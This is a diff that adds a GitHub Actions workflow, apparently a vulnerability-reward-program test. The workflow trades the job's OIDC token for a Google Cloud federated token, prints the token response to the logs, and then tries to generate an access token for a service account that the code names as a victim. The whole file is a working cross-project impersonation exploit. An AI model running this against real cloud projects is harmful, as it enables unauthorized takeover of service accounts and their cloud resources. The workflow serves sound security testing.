@@ -1,0 +1,39 @@
+name: wif-test
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get GitHub OIDC token
+        id: idtoken
+        run: |
+          IDTOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/projects/894411084486/locations/global/workloadIdentityPools/s0-wif-pool/providers/s0-github-provider" \
+            | jq -r '.value')
+          echo "idtoken=$IDTOKEN" >> "$GITHUB_OUTPUT"
+      - name: Exchange for GCP federated token
+        id: fedtoken
+        run: |
+          RESP=$(curl -sS -X POST https://sts.googleapis.com/v1/token \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"audience\": \"//iam.googleapis.com/projects/894411084486/locations/global/workloadIdentityPools/s0-wif-pool/providers/s0-github-provider\",
+              \"grantType\": \"urn:ietf:params:oauth:grant-type:token-exchange\",
+              \"requestedTokenType\": \"urn:ietf:params:oauth:token-type:access_token\",
+              \"subjectToken\": \"${{ steps.idtoken.outputs.idtoken }}\",
+              \"subjectTokenType\": \"urn:ietf:params:oauth:token-type:jwt\",
+              \"scope\": \"https://www.googleapis.com/auth/cloud-platform\"
+            }")
+          echo "FEDRESP: $RESP"
+          FEDTOKEN=$(echo "$RESP" | jq -r '.access_token')
+          echo "fedtoken=$FEDTOKEN" >> "$GITHUB_OUTPUT"
+      - name: Try to impersonate victim service account
+        run: |
+          curl -sS -X POST \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/s0-build-runner@vrp-s0-victim-1792291139.iam.gserviceaccount.com:generateAccessToken" \
+            -H "Authorization: Bearer ${{ steps.fedtoken.outputs.fedtoken }}" \
+            -H "Content-Type: application/json" \
+            -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
